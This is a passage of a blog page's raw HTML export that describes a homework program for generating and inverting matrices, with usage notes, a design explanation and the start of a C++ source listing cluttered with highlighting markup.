class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br></pre></td></tr></table></figure>\n","excerpt":"<p>Author: Song Li<br><a href=\"/download/Matrix-invert.zip\">Download Project</a></p>\n<p>##AIM##<br>This program is used to generate, invert matrix. Just use row addups and swaps rows randomly to generate a invertable matrix.<br>","more":"</p>\n<p>##USAGE##</p>\n<ul>\n<li>Invert Matrix: To use the invert function, users need to input the Maxtric File right after the program. Here is an example: $$./debug/invert~./debug/input$$</li>\n<li>Generate Matrix: To use the generate function, users need to input $-g$ after the program and the size of matrix after the $-g$. Here is an example:<br>$$./debug/invert~-g~3$$<br>This command will generate a $3*3$ matrix, and this maxtrix will be output to the terminal and stored in the $./debug/generate$ file at the same time.<br>##COMPILE##<br>Just use $make$ in the root dir of this program to compile this program. I didn’t modify the $Makefile$<br>##FILE STRUCTURE##</li>\n<li>Makefile</li>\n<li>README.pdf</li>\n<li>debug/: contains the runable program and generated matrix</li>\n<li>matrix1-sol315.txt</li>\n<li>matrix2-sol315.txt</li>\n<li>object/</li>\n<li>pivoting-sol315.txt</li>\n<li>source/main.cpp: main code of this program</li>\n<li>source/StdAfx.cpp: useless</li>\n<li>source/StdAfx.h: head file </li>\n<li>source/parseMatrix.cpp: this code is used to input and output the matrix</li>\n<li>source/parseMatrix.h: head file of paraseMatrix.cpp<br>##RESULT##<br>Most of the result will be output directely in the terminal. The generated matrix will be output in both terminal and $/debug/generate$ file.<br>##DESIGN##<br>In this part, I mainly talk about how I generate a matrix which is invertable.<br>Firstly, I generate a matrix which is random double numbers in the diagonal line, and other numbers are all 0. Like this:<br>$$<br>\\begin{bmatrix}<br>1.231 &amp; 0.000 &amp; 0.000 &amp; 0.000 \\\\<br>0.000 &amp; 1.002 &amp; 0.000 &amp; 0.000 \\\\<br>0.000 &amp; 0.000 &amp; 1923.412 &amp; 0.000 \\\\<br>0.000 &amp; 0.000 &amp; 0.000 &amp; 0.023 \\\\<br>\\end{bmatrix}<br>$$</li>\n</ul>\n<p>After that, I randomly pick a line, use a random double number times every number of this line, and add it to another random line.If I pick line 2 and number 2, and add this line to the 4th line. The result will be like<br>$$<br>\\begin{bmatrix}<br>1.231&amp;0.000&amp;0.000&amp;0.000 \\\\<br>0.000&amp;1.002&amp;0.000&amp;0.000 \\\\<br>0.000&amp;0.000&amp;1923.412&amp;0.000 \\\\<br>0.000&amp;2.004&amp;0.000&amp;0.023 \\\\<br>\\end{bmatrix}<br>$$<br>Some times later, we can get a random matrix. Generately speaking, we can get every matrix in this way.</p>\n<p>Main function code is here. The whole project can be downloaded from the link at the begining of this blog.</p>\n<figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br><span class=\"line\"><span class=\"regexp\">//Implementation for the Main method</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">//</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#include \"StdAfx.h\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\"></span><br><span class=\"line\">inline double getRandDouble()&#123;</span><br><span class=\"line\">    return (double)rand() / (double)rand() * (double)((rand() &amp; 1 &lt;&lt; 1) - 1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void defaultOutput()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">## 411 Homework: Numerical Analysis                    ##\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">## Brian Chen, Oct 20, 2012                            ##\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"Usage:\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"invert \\n\");</span><br><span class=\"line\">\t\tprintf(\"With no arguments, invert returns this usage statement.\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"invert &lt;filename&gt;\\n\");</span><br><span class=\"line\">\t\tprintf(\"Prints out two matrix inverses for the provided matrix.\\n\");</span><br><span class=\"line\">\t\tprintf(\" -- the first inverse is computed with simple inversion.\\n\");</span><br><span class=\"line\">\t\tprintf(\" -- the second is computed with partial pivoting\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"invert -format\\n\");</span><br><span class=\"line\">\t\tprintf(\"Describes the file format for the input file.\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span 